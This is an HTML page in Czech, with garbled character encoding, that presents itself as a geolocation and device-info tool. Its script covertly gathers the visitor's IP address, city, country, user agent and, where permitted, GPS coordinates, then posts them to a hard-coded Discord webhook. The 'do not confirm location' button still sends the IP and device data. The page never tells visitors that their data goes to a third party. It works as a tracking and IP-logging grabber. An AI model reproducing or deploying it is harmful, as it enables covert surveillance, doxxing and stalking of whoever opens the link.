<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace a Informace o Za≈ô√≠zen√≠</title>
    <style>
        #map {
            height: 400px;
            width: 100%;
        }
        body {
            font-family: Arial, sans-serif;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
    <script>
        // Funkce pro z√≠sk√°n√≠ informac√≠
        function getDeviceInfo(confirmLocation) {
            var userAgent = navigator.userAgent;

            // Z√≠sk√°n√≠ ve≈ôejn√© IP adresy
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;
                    // Z√≠sk√°n√≠ mƒõsta a zemƒõ pomoc√≠ IP geolokaƒçn√≠ho API
                    fetch(`https://ipinfo.io/${ipAddress}/json`)
                        .then(response => response.json())
                        .then(info => {
                            var city = info.city;
                            var country = info.country;

                            // VPN status (Toto je velmi z√°kladn√≠ kontrola, pot≈ôebuje pokroƒçilej≈°√≠ detekci)
                            var vpnStatus = "Nezn√°m√©"; // Tohle bych doporuƒçil detekovat pomoc√≠ extern√≠ho API nebo knihovny

                            // Z√≠sk√°n√≠ GPS sou≈ôadnic nebo zobrazen√≠ "GPS nepotvrzena"
                            if (confirmLocation) {
                                if (navigator.geolocation) {
                                    navigator.geolocation.getCurrentPosition(position => {
                                        var lat = position.coords.latitude;
                                        var lon = position.coords.longitude;

                                        // Odesl√°n√≠ informac√≠ na Discord webhook
                                        sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon);

                                        // Zobrazen√≠ mapy
                                        displayMap(lat, lon);
                                    }, () => {
                                        alert("Chyba p≈ôi z√≠sk√°v√°n√≠ GPS sou≈ôadnic.");
                                    });
                                } else {
                                    alert("Geolokace nen√≠ podporov√°na t√≠mto prohl√≠≈æeƒçem.");
                                }
                            } else {
                                // Pokud u≈æivatel nepotvrd√≠ polohu
                                var lat = "GPS nepotvrzena";
                                var lon = "GPS nepotvrzena";

                                // Odesl√°n√≠ informac√≠ na Discord webhook bez GPS
                                sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon);
                            }
                        });
                });
        }

        // Funkce pro zobrazen√≠ mapy na Mapy.cz
        function displayMap(lat, lon) {
            var mapUrl = `https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13&source=base&id=marker-${lat},${lon}`; // URL pro Mapy.cz
            document.getElementById("map").innerHTML = `
                <iframe src="${mapUrl}" width="100%" height="400" frameborder="0" style="border:0;" allowfullscreen></iframe>
            `;
        }

        // Funkce pro odesl√°n√≠ informac√≠ na Discord webhook
        function sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon) {
            var webhookUrl = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
            var message = {
                content: `
                    üì± Za≈ô√≠zen√≠: ${userAgent}
                    üåç IP Adresa: ${ipAddress} (Mƒõsto: ${city}, Zemƒõ: ${country})
                    üåê VPN: ${vpnStatus}
                    üìç GPS Sou≈ôadnice: ${lat}, ${lon}
                    üîó Mapa: [Zobrazit na Mapy.cz](https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13&source=base&id=marker-${lat},${lon})
                `
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(message)
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <h2>Geolokace a Informace o Za≈ô√≠zen√≠</h2>
        <button onclick="getDeviceInfo(true)">Potvrdit Polohu</button>
        <button onclick="getDeviceInfo(false)">Nepotvrdit Polohu</button>
        <div id="map"></div>
    </div>
</body>
</html>
